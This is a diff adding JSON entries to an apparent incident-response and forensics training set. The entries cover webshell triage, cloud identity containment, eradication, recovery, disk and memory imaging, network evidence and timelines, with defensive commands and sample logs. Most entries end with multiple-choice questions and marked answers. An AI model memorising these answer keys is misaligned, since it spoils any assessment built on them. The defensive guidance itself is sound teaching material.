+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["insider", "hr", "legal", "privacy", "evidence"]
+    },
+    {
+      "id": "ir-webcomp-012",
+      "subtopic": "ir-playbook-web",
+      "difficulty": "intermediate",
+      "title": "Web compromise: webshells, skimmers and log-first triage",
+      "fact": "Web-server incidents usually present as defacement, a webshell, SEO spam, redirects or a payment-card skimmer injected into checkout pages. Triage starts with the access log: requests to unusual paths returning 200, POSTs of unusual size, odd user agents, and a small set of source addresses repeatedly hitting the same script. Preserve logs and a filesystem snapshot before the site is rebuilt or the WAF starts blocking, because blocking tells the actor they are observed and may prompt them to clean up their own tooling. Then scope persistence outside the web root - cron, systemd units, CMS plugins, database-stored templates, .htaccess and load-balancer configuration - and determine whether cardholder or personal data was exposed, which triggers PCI or privacy obligations.",
+      "details": [
+        "Webshells are often small, lightly obfuscated and hidden among legitimate uploads; compare against a known-good file inventory.",
+        "A skimmer may live only in a database or template, so a filesystem diff alone can miss it.",
+        "Check for outbound connections from the web tier, which may indicate staging or a command channel."
+      ],
+      "logs": [
+        {
+          "context": "nginx access log on web01.example.internal",
+          "text": "198.51.100.23 - - [04/Mar/2026:13:02:11 +0000] \"POST /wp-content/uploads/2024/cache.php HTTP/1.1\" 200 412 \"-\" \"Mozilla/5.0\"\n198.51.100.23 - - [04/Mar/2026:13:02:15 +0000] \"POST /wp-content/uploads/2024/cache.php HTTP/1.1\" 200 98304 \"-\" \"Mozilla/5.0\"\n198.51.100.23 - - [04/Mar/2026:13:04:40 +0000] \"GET /checkout/ HTTP/1.1\" 200 5120 \"-\" \"curl/7.81.0\"",
+          "reading": "A PHP file in an uploads directory receiving small POSTs that return large responses is a webshell pattern; a checkout fetch with a curl user agent from the same address suggests automated reconnaissance or skimmer verification. The response sizes indicate command output. Preserve the file and logs before removing it."
+        }
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "awk '$9==200 && $7 ~ /\\.php$/ {print $1, $7, $10}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20",
+          "purpose": "Summarise successful PHP requests by source and path to surface unusual endpoints and heavy POST bodies."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why should web logs and a filesystem snapshot be captured before the WAF blocks the attacker's addresses?",
+          "options": [
+            "Because logs are deleted automatically when a block rule is created",
+            "Because visible blocking can cause the actor to remove tooling and change infrastructure, destroying evidence value",
+            "Because WAF rules cannot be reversed",
+            "Because the snapshot is needed to restore service"
+          ],
+          "answer": [1],
+          "rationale": "Blocking is a containment action that signals detection. Actors frequently delete webshells or move infrastructure once blocked, so evidence and scope should be captured first, then containment applied deliberately."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Cybersecurity Advisories",
+          "publisher": "CISA",
+          "url": "https://www.cisa.gov/news-events/cybersecurity-advisories",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["web", "webshell", "skimmer", "logs"]
+    },
+    {
+      "id": "ir-cloud-013",
+      "subtopic": "ir-playbook-cloud",
+      "difficulty": "advanced",
+      "title": "Cloud incidents are identity-first and evidence is ephemeral",
+      "fact": "In cloud environments the control plane is the primary evidence and identity is the primary attack surface, so response starts by containing identities and access keys while preserving control-plane logs: AWS CloudTrail, Azure Activity Log with Entra sign-in and audit logs, and Google Cloud Audit Logs. Take disk and, where the provider supports it, memory snapshots before terminating an instance, because termination destroys local evidence and releasing an elastic address can break the association between an address and a host. Scope the blast radius through IAM: new users, access keys, role trust-policy changes, new service principals and resource policies that grant public access. Shared responsibility matters here: the provider secures the physical and hypervisor layers, while the customer owns identity configuration, data and workload logs.",
+      "details": [
+        "CloudTrail's console event history covers 90 days of management events; longer retention requires a trail delivering to object storage.",
+        "Look for resource creation that indicates cryptomining or staging: many GPU instances, new VPCs, public buckets and shared snapshots.",
+        "Provider incident-response support routes and legal-process channels differ; know them before an incident."
+      ],
+      "configs": [
+        {
+          "language": "json",
+          "snippet": "{\n  \"eventTime\": \"2026-03-04T21:14:02Z\",\n  \"eventSource\": \"iam.amazonaws.com\",\n  \"eventName\": \"CreateAccessKey\",\n  \"userIdentity\": {\"type\": \"IAMUser\", \"userName\": \"svc-reporting\"},\n  \"sourceIPAddress\": \"203.0.113.90\",\n  \"userAgent\": \"aws-cli/2.15.0\"\n}",
+          "purpose": "Illustrative CloudTrail management event showing the fields used to attribute an identity action."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "What is the most important first containment step for a suspected cloud account compromise?",
+          "options": [
+            "Terminate every instance in the account",
+            "Contain the identity: disable or rotate credentials, revoke sessions and restrict permissions",
+            "Delete the account's VPCs to stop network access",
+            "Rotate all TLS certificates"
+          ],
+          "answer": [1],
+          "rationale": "Cloud compromise is usually exercised through identities and APIs. Terminating instances destroys evidence, and network deletion is disruptive without stopping API access. Containing the identity and its keys, then scoping IAM changes, addresses the actual attack path."
+        }
+      ],
+      "pitfalls": [
+        "Terminating the compromised instance before snapshotting it, losing the only local evidence.",
+        "Reviewing only the workload logs and missing the control-plane events that show how access was obtained and what was changed."
+      ],
+      "references": [
+        {
+          "title": "AWS CloudTrail concepts",
+          "publisher": "Amazon Web Services",
+          "url": "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-concepts.html",
+          "license": "CC-BY-SA-4.0"
+        },
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["cloud", "iam", "cloudtrail", "ephemeral-evidence"]
+    },
+    {
+      "id": "ir-contain-014",
+      "subtopic": "ir-containment",
+      "difficulty": "advanced",
+      "title": "Containment trade-offs: what each option costs you",
+      "fact": "Every containment action trades damage against visibility and evidence. Network isolation that keeps the EDR management channel alive preserves telemetry and remote triage; a full shutdown stops spread but destroys memory, may lose keys held only in RAM and, with some ransomware, can trigger additional damage on reboot. Disabling an account stops the actor but reveals the response, while disabling only the mailbox preserves the ability to watch. Perimeter blocking of command and control reduces harm but teaches the actor that the channel is burned, often causing a switch of infrastructure or acceleration of the objective. Monitoring-only containment is legitimate only with incident-commander and legal approval, a defined intelligence objective and an explicit exit condition.",
+      "details": [
+        "Choose containment per actor objective: data theft calls for cutting exfiltration paths, while encryption calls for isolating file-sharing paths.",
+        "Record which trade-off was chosen and who approved it; post-incident review will ask.",
+        "Containment that cannot be sustained for the duration of the incident is not containment."
+      ],
+      "mcqs": [
+        {
+          "question": "Investigators want to observe an actor's command-and-control channel to identify additional victims. Which condition makes monitoring-only containment defensible?",
+          "options": [
+            "The SOC analyst on shift thinks it is interesting",
+            "Incident commander and legal approval, a defined objective, and a clear exit condition with fallback containment",
+            "The channel uses HTTPS",
+            "The affected host is not business critical"
+          ],
+          "answer": [1],
+          "rationale": "Deliberately leaving a channel open accepts ongoing risk. It requires accountable approval, a specific intelligence objective, monitoring that can detect escalation and a pre-agreed point at which containment is imposed."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["containment", "trade-offs", "isolation", "decision-rights"]
+    },
+    {
+      "id": "ir-erad-015",
+      "subtopic": "ir-eradication",
+      "difficulty": "intermediate",
+      "title": "Eradication is verification, not deletion",
+      "fact": "Eradication means removing the root cause and every access path the actor built, then proving it. Deleting the visible malware is the easy part; the work is enumerating persistence and access across identity, host, network and SaaS layers: local and domain accounts, scheduled tasks, services, WMI subscriptions, run keys, SSH authorized_keys, cron and systemd units, web shells, OAuth grants, API keys, VPN profiles and firewall rules. Rebuild rather than clean when compromise reached kernel level, when scope is not fully understood, or when the entry vector cannot be closed. Verification uses both indicator sweeps and behaviour-based hunting, because a competent actor will have changed indicators between visits.",
+      "details": [
+        "Reset credentials from a clean host and in the right order, starting with identity infrastructure such as directory services and identity providers.",
+        "Patch or remove the entry vector before restoring access, or the actor returns through the same door.",
+        "Record negative findings with the query used, so verification is auditable rather than asserted."
+      ],
+      "commands": [
+        {
+          "language": "powershell",
+          "code": "Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\\\\Microsoft\\\\*'} | Select-Object TaskName,TaskPath,State",
+          "purpose": "Enumerate non-Microsoft scheduled tasks as part of a persistence sweep."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "When is rebuilding a host preferable to cleaning it?",
+          "options": [
+            "Whenever malware is detected, without exception",
+            "When compromise reached kernel level, scope is not fully understood, or the entry vector cannot be closed",
+            "Only when the host is a domain controller",
+            "When the user requests it"
+          ],
+          "answer": [1],
+          "rationale": "Cleaning can be adequate when scope is understood and persistence is fully removed. Rebuilding is the safer choice when the compromise may be below the visibility line, when the extent is unknown, or when the original entry path remains open."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "Deleting the malware binary and running a full antivirus scan completes eradication.",
+          "correction": "Eradication requires removing every access path the actor created, including accounts, tickets, scheduled tasks, services, WMI subscriptions, web shells, SSH keys, OAuth grants and cloud credentials. Scans only find known files; persistence and identity access usually survive them."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "ATT&CK: Scheduled Task/Job (T1053)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1053/",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["eradication", "persistence", "verification", "rebuild"]
+    },
+    {
+      "id": "ir-recover-016",
+      "subtopic": "ir-recovery",
+      "difficulty": "intermediate",
+      "title": "Recovery validation and the heightened-monitoring window",
+      "fact": "Recovery is a controlled return rather than a switch-flip: restore in stages, verify the integrity of restored data and configuration, confirm the entry vector is closed, and only then reconnect to production networks. Run restored systems in an isolated environment long enough to observe whether they attempt to reach old infrastructure, and scan or rebuild backups rather than trusting them. Define a heightened-monitoring window with a named owner, specific detections to watch and a closing criterion, because 'we will keep an eye on it' decays within days. Business owners sign off on restoration of service; security signs off on the conditions attached to it.",
+      "details": [
+        "Watch for re-entry attempts through the original vector, which is the best available test of eradication.",
+        "Validate that logging, EDR and backup agents are running on restored hosts before they carry traffic.",
+        "A shortened recovery that skips validation usually produces a second incident and a longer outage."
+      ],
+      "mcqs": [
+        {
+          "question": "Which element makes a heightened-monitoring period after recovery meaningful?",
+          "options": [
+            "An open-ended commitment to watch alerts more closely",
+            "A named owner, specific detections, a defined duration and an explicit closing criterion",
+            "Disabling automated alerting to reduce noise",
+            "Returning all systems to service at once to restore productivity"
+          ],
+          "answer": [1],
+          "rationale": "Open-ended monitoring erodes quickly and cannot be audited. A named owner, targeted detections, a fixed window and a closing criterion keep attention focused and make it possible to decide, with evidence, when the heightened period can end."
+        }
+      ],
+      "pitfalls": [
+        "Restoring systems from backups that were never validated or scanned.",
+        "Reconnecting restored hosts before confirming that logging and endpoint agents are healthy."
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Federal Government Cybersecurity Incident and Vulnerability Response Playbooks",
+          "publisher": "CISA",
+          "url": "https://www.cisa.gov/resources-tools/resources/federal-government-cybersecurity-incident-and-vulnerability-response-playbooks",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["recovery", "validation", "monitoring", "restore"]
+    },
+    {
+      "id": "ir-lessons-017",
+      "subtopic": "ir-post-incident",
+      "difficulty": "foundational",
+      "title": "Post-incident review: blameless, evidenced, tracked",
+      "fact": "A post-incident review held within about two weeks, while participants still remember decisions, produces a timeline, a list of what worked, what failed, and the detection and response gaps expressed as concrete changes. Keep it blameless about individuals while being precise about system failures, and tie findings to owners, dates and a tracking mechanism that someone actually reviews. Useful metrics include time from first evidence to detection, time to containment, dwell time and the proportion of the estate with usable telemetry, but any single metric can be gamed and mean time to recovery in particular can reward premature closure. Share a sanitised version so other teams learn without exposing victim details.",
+      "details": [
+        "Map missed detections to ATT&CK techniques to expose coverage patterns rather than one-off gaps.",
+        "Distinguish 'the control failed' from 'the control was never deployed', because the fixes differ.",
+        "Verify that closed action items are effective, not merely marked done in the tracker."
+      ],
+      "mcqs": [
+        {
+          "question": "Why can mean time to recovery (MTTR) be a misleading incident metric on its own?",
+          "options": [
+            "It is impossible to measure",
+            "It can reward premature closure and ignores whether the root cause was removed or the actor evicted",
+            "It only applies to cloud incidents",
+            "It is always higher than dwell time"
+          ],
+          "answer": [1],
+          "rationale": "A team can shorten MTTR by restoring service before eradication is verified, leaving the organisation exposed to reinfection. MTTR needs to be read alongside detection time, eradication evidence and recurrence rates."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["lessons-learned", "metrics", "blameless", "improvement"]
+    },
+    {
+      "id": "ir-tabletop-018",
+      "subtopic": "ir-exercises",
+      "difficulty": "foundational",
+      "title": "Tabletop exercises must test decisions, not trivia",
+      "fact": "A tabletop exercise walks a realistic scenario through the people who would actually make decisions, using timed injects that force choices under incomplete information: who declares, who calls legal, whether to isolate a revenue system, what is said to customers. The point is to surface friction in authority, contact data, tooling access and communication, so the exercise must include executives, communications, legal and business owners, not only the SOC. Discussion-only exercises are cheap and repeatable; functional and red-team exercises validate that tools and procedures work when executed. Record gaps as findings with owners, and re-test the same scenario later to confirm improvement.",
+      "details": [
+        "Injects should escalate: a second host, a journalist call, a regulator deadline and a backup that will not restore.",
+        "No-fault ground rules increase candour; blaming participants produces a rehearsed performance instead of a test.",
+        "Measure decision latency and information flow, not how many facts participants can recall."
+      ],
+      "configs": [
+        {
+          "language": "yaml",
+          "snippet": "exercise: ransomware-tabletop-2026-02\nscenario: file-share encryption with data theft\nparticipants: [incident-commander, ciso, counsel, comms, finance, ops]\ninjects:\n  - {at: T+00:15, event: backup console unreachable}\n  - {at: T+00:45, event: journalist requests comment}\n  - {at: T+01:30, event: regulator asks for timeline}\nobjectives: [test declaration authority, test legal escalation, test customer messaging]\ncapture: decision-log, gaps-register",
+          "purpose": "Illustrative exercise plan with timed injects and explicit objectives to test decisions rather than knowledge."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which outcome indicates a tabletop exercise was well designed?",
+          "options": [
+            "Participants answered all technical questions correctly",
+            "The exercise revealed unclear decision rights or contact failures before a real incident",
+            "The scenario was resolved within the scheduled hour",
+            "No disagreements occurred between teams"
+          ],
+          "answer": [1],
+          "rationale": "Exercises exist to find friction in authority, contact data, tooling and communication. Friction discovered in a tabletop is a success, because it can be fixed cheaply; a smooth run with no findings often means the scenario was not demanding enough."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Federal Government Cybersecurity Incident and Vulnerability Response Playbooks",
+          "publisher": "CISA",
+          "url": "https://www.cisa.gov/resources-tools/resources/federal-government-cybersecurity-incident-and-vulnerability-response-playbooks",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["tabletop", "exercises", "readiness", "decision-making"]
+    },
+    {
+      "id": "ir-doc-019",
+      "subtopic": "ir-documentation",
+      "difficulty": "foundational",
+      "title": "Contemporaneous documentation is evidence and memory",
+      "fact": "A single incident log, with UTC timestamps, the person acting, the action taken, the evidence reference and the reason, is the backbone of both coordination and legal defensibility. Contemporaneous notes carry far more weight than reconstructions written afterwards, so record decisions and negative findings as they happen, including 'checked source, found nothing, query attached'. Keep chat exports, ticket links, hashes and screenshots tied to the log, avoid editorialising or speculation, and distinguish observed fact from inference. During handover the log is what keeps the next shift from repeating work or destroying evidence.",
+      "details": [
+        "Use one authoritative timeline and link sub-timelines to it rather than maintaining several competing ones.",
+        "Record who authorised destructive or disruptive actions, and when.",
+        "Note tool versions and query text so results can be reproduced by another analyst."
+      ],
+      "mcqs": [
+        {
+          "question": "Which entry is most useful in an incident log?",
+          "options": [
+            "'Isolated host, seemed bad'",
+            "'10:42Z j.okoro isolated host-fs02 from the server VLAN per IC approval (INC-4412), memory image captured first, hash recorded'",
+            "'Attacker was probably an insider'",
+            "'Waiting on vendor'"
+          ],
+          "answer": [1],
+          "rationale": "A defensible entry records time in UTC, actor, action, authorisation, evidence handling and case reference. Vague impressions ('seemed bad', 'probably') are not reproducible and may prejudice later analysis or legal review."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "The team will remember what happened, so a detailed log can be written at the end.",
+          "correction": "Memory degrades within hours and is reconstructed to fit the outcome. Contemporaneous notes capture sequence, authorisation and negative findings, and they are the records that survive scrutiny in reviews, tribunals and regulatory enquiries."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "RFC 3227: Guidelines for Evidence Collection and Archiving",
+          "publisher": "IETF",
+          "url": "https://www.rfc-editor.org/rfc/rfc3227.html",
+          "license": "IETF Trust Legal Provisions"
+        }
+      ],
+      "tags": ["documentation", "timeline", "evidence", "handover"]
+    },
+    {
+      "id": "forensics-volatility-020",
+      "subtopic": "forensics-order-of-volatility",
+      "difficulty": "foundational",
+      "title": "Order of volatility drives collection sequence",
+      "fact": "RFC 3227 recommends collecting evidence from most to least volatile: CPU registers and cache, memory, network state and traffic, running processes, then disk, then remote logs and monitoring data, then archival media and paperwork. The rationale is simple: a process table or ARP cache may be gone in seconds, while a powered-off disk keeps its contents for years. Collection should be planned so that acquiring one item does not destroy another, since memory capture writes to disk and packet capture competes for bandwidth, so sequence and tooling are chosen together. Business continuity and physical safety override strict volatility order, and the report should say when that happened.",
+      "details": [
+        "Container and cloud workloads add ephemeral layers: a container filesystem may vanish with the pod while the node disk persists.",
+        "Record the system clock, time zone and uptime before collection, then convert to UTC for the timeline.",
+        "If a host must stay running for business reasons, state the constraint and what evidence was therefore lost or degraded."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "date -u; uptime; ss -tunap; ps -eo pid,ppid,user,lstart,args",
+          "purpose": "Capture clock, uptime, network state and process list before any disruptive action on a live host."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "According to RFC 3227's order of volatility, which should generally be collected first?",
+          "options": [
+            "The hard disk image",
+            "CPU registers, cache and memory",
+            "Archival backups",
+            "Printed documentation"
+          ],
+          "answer": [1],
+          "rationale": "RFC 3227 orders collection from most to least volatile, starting with registers and cache, then memory, network state, running processes and only later disk and archival media, because volatile state disappears fastest."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "The safest first action on a suspected compromised host is to pull the power.",
+          "correction": "Powering off destroys memory-resident evidence such as running processes, network state, injected code and keys, and can trigger destructive behaviour on next boot. Capture volatile data first and isolate at the network layer; power removal is a last resort that should be documented as such."
+        }
+      ],
+      "references": [
+        {
+          "title": "RFC 3227: Guidelines for Evidence Collection and Archiving",
+          "publisher": "IETF",
+          "url": "https://www.rfc-editor.org/rfc/rfc3227.html",
+          "license": "IETF Trust Legal Provisions"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["volatility", "collection", "rfc3227", "live-response"]
+    },
+    {
+      "id": "forensics-disk-021",
+      "subtopic": "forensics-disk-imaging",
+      "difficulty": "foundational",
+      "title": "Disk imaging: write blocking, hashing and verification",
+      "fact": "A forensic image is a sector-level copy of the source, taken through a write blocker so the original is never modified, with a hash of the source computed and matched against the image. Raw images in the dd style are simple and universally readable; the EnCase Evidence File (E01) format adds compression, case metadata and per-block checksums; AFF4 provides an open specification with similar integrity features. Document the tool and version, source device identifiers, hash algorithm, bad sectors or read errors, and destination media, because an image with unexplained gaps is a weak exhibit. Work from the verified copy and keep the original sealed.",
+      "details": [
+        "For large or failing media, use a tool that logs read errors instead of silently substituting zeros.",
+        "Verify the image hash after transfer to analysis storage, not only at acquisition.",
+        "For live systems, targeted or logical collection may be more appropriate than a full image, but state which was done and why."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "dc3dd if=/dev/sdb of=/evidence/host-01.dd hash=sha256 log=/evidence/host-01.dc3dd.log",
+          "purpose": "Acquire a raw image with a logged SHA-256 and an error log for later review."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "What is the purpose of a write blocker during disk acquisition?",
+          "options": [
+            "To speed up the imaging process",
+            "To prevent any write operation from modifying the source evidence",
+            "To encrypt the resulting image",
+            "To compress the image to save space"
+          ],
+          "answer": [1],
+          "rationale": "A write blocker permits reads while blocking writes, so the source device is not altered during acquisition. Speed, compression and encryption are separate properties of imaging tools and formats."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "The Sleuth Kit",
+          "publisher": "Sleuth Kit Labs",
+          "url": "https://www.sleuthkit.org/sleuthkit/",
+          "license": "CPL-1.0"
+        }
+      ],
+      "tags": ["imaging", "write-blocker", "hashing", "e01", "aff4"]
+    },
+    {
+      "id": "forensics-memory-022",
+      "subtopic": "forensics-memory",
+      "difficulty": "intermediate",
+      "title": "Memory evidence: what it holds and how it is acquired",
+      "fact": "Memory holds process lists, command lines, network connections, injected code, encryption keys, clipboard and chat fragments, and unpacked malware that never touches disk. Acquisition uses a kernel driver such as WinPmem on Windows or LiME on Linux, a hardware device, or a hypervisor snapshot, and each method perturbs the system to some degree. Hibernation files and pagefile or swap contents provide partial, time-shifted memory images. Analysis with Volatility 3 needs the symbol table matching the exact kernel build, which is why capturing build information alongside the image matters; a mismatched profile produces plausible but wrong results.",
+      "details": [
+        "Record the acquisition tool and version, hash, uptime and clock offset with the image.",
+        "Encrypted volumes yield keys from memory only while mounted, so capture before locking or shutting down.",
+        "Memory analysis can recover malware configuration without executing the sample."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "vol -f host-01.raw windows.pslist",
+          "purpose": "List processes from a Windows memory image with Volatility 3."
+        },
+        {
+          "language": "bash",
+          "code": "vol -f host-01.raw windows.netscan",
+          "purpose": "List network endpoints and owning processes from a memory image."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why must the kernel build be known when analysing a Windows memory image with Volatility 3?",
+          "options": [
+            "Because the image is encrypted with a build-specific key",
+            "Because symbol tables are version-specific, and a mismatch yields plausible but incorrect results",
+            "Because Volatility can only read images smaller than 4 GB",
+            "Because the tool requires a licence per build"
+          ],
+          "answer": [1],
+          "rationale": "Volatility resolves kernel structures through symbol tables tied to a specific build. Using the wrong profile produces output that looks valid but misinterprets structure offsets, which can silently corrupt findings."
+        }
+      ],
+      "references": [
+        {
+          "title": "Volatility 3 documentation",
+          "publisher": "Volatility Foundation",
+          "url": "https://volatility3.readthedocs.io/",
+          "license": "Volatility Software License (VSL)"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["memory", "volatility", "acquisition", "symbols"]
+    },
+    {
+      "id": "forensics-network-023",
+      "subtopic": "forensics-network",
+      "difficulty": "intermediate",
+      "title": "Network evidence: packets, flows and the limits of each",
+      "fact": "Full packet capture provides content and protocol detail but is expensive to store and often retained for days, while flow records such as NetFlow, IPFIX and cloud VPC flow logs provide metadata for weeks or months with no payload. Zeek turns a packet feed into connection, DNS, HTTP and TLS logs, which is often the most analysis-friendly form for incident work. Correlation requires handling NAT and load balancers, because one internal address may map to many external sessions, and it requires a trustworthy time source across capture points. TLS 1.3 traffic is opaque without session keys, so metadata and endpoint telemetry carry the investigation.",
+      "details": [
+        "Check capture-point placement: a span port that misses inter-VLAN traffic creates blind spots that look like absence of activity.",
+        "DNS logs often reconstruct command-and-control and tunnelling better than proxy logs alone.",
+        "Preserve captures with hashes and record the capture filter, interface and drop counters."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "tshark -r capture.pcap -Y 'dns' -T fields -e frame.time_utc -e ip.src -e dns.qry.name | head -50",
+          "purpose": "List DNS queries with UTC timestamps from a capture for beaconing and tunnelling review."
+        }
+      ],
+      "logs": [
+        {
+          "context": "Proxy log showing periodic check-ins",
+          "text": "2026-03-03T00:04:12Z 10.20.30.41 GET hxxps://sync-node.example.test/api/v1/ping 200 412 318 512\n2026-03-03T00:09:12Z 10.20.30.41 GET hxxps://sync-node.example.test/api/v1/ping 200 412 318 512\n2026-03-03T00:14:13Z 10.20.30.41 GET hxxps://sync-node.example.test/api/v1/ping 200 412 318 512\n2026-03-03T00:19:11Z 10.20.30.41 GET hxxps://sync-node.example.test/api/v1/ping 200 412 318 512",
+          "reading": "Near-identical request size, response size and roughly five-minute spacing to a single rare destination is a beacon pattern. The small variance is jitter. Pivot to the process on 10.20.30.41 making these connections, then check other hosts for the same domain or TLS fingerprint."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which source is most likely to preserve evidence of internal lateral movement that full packet capture missed due to a span-port gap?",
+          "options": [
+            "Flow records from routers and switches",
+            "The host's prefetch files",
+            "Printed network diagrams",
+            "The domain controller's SYSVOL share"
+          ],
+          "answer": [0],
+          "rationale": "Flow metadata from network devices records connections even when payload capture was incomplete, and it is often retained longer. Prefetch shows local execution but not the network path, and the other options carry no connection history."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "tshark manual page",
+          "publisher": "Wireshark Foundation",
+          "url": "https://www.wireshark.org/docs/man-pages/tshark.html",
+          "license": "GPL-2.0-or-later"
+        }
+      ],
+      "tags": ["network", "pcap", "netflow", "dns", "beaconing"]
+    },
+    {
+      "id": "forensics-timeline-024",
+      "subtopic": "forensics-timeline",
+      "difficulty": "foundational",
+      "title": "Timelines: normalise, then interpret",
+      "fact": "A timeline is a derived artifact: each source has its own clock, precision and semantics, so normalising everything to UTC and recording source and precision per event prevents false conclusions. NTFS timestamps have 100-nanosecond resolution but update with documented and undocumented rules, FAT has two-second granularity, and application logs may record local time without an offset. Plaso (log2timeline) builds super-timelines across dozens of artifact types, and psort filters and orders them; mactime from The Sleuth Kit handles filesystem MACB times. The analyst's job is to explain gaps and contradictions, not to smooth them away.",
+      "details": [
+        "MACB means modified, accessed, changed (MFT entry change) and born (creation), each with different update behaviour.",
+        "Clock skew and time-zone misconfiguration are common on virtual machines and appliances; compare against an external reference.",
+        "A single-source timeline is a story; a multi-source timeline is evidence."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "log2timeline.py --storage-file case.plaso /evidence/host-01.dd",
+          "purpose": "Build a Plaso storage file from a disk image for super-timeline analysis."
+        },
+        {
+          "language": "bash",
+          "code": "psort.py -o l2tcsv -w timeline.csv case.plaso \"date > '2026-03-01 00:00:00'\"",
+          "purpose": "Export a filtered CSV timeline beginning at a chosen UTC date."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why should each timeline event record its source and precision?",
+          "options": [
+            "To satisfy chain-of-custody requirements only",
+            "Because different sources have different clock accuracy, granularity and update semantics, which affects interpretation",
+            "Because tools refuse to merge events without it",
+            "To make the output smaller"
+          ],
+          "answer": [1],
+          "rationale": "An event accurate to two seconds and an event accurate to 100 nanoseconds cannot be ordered with equal confidence, and application clocks may be skewed. Recording source and precision lets the analyst weigh contradictions instead of over-reading the sequence."
+        }
+      ],
+      "references": [
+        {
+          "title": "Plaso documentation",
+          "publisher": "Plaso project",
+          "url": "https://plaso.readthedocs.io/",
+          "license": "Apache-2.0"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["timeline", "plaso", "mactime", "timezones"]
+    },
+    {
+      "id": "forensics-mft-025",
+      "subtopic": "forensics-windows-mft",
+      "difficulty": "advanced",
+      "title": "MFT timestamps: $STANDARD_INFORMATION versus $FILE_NAME",
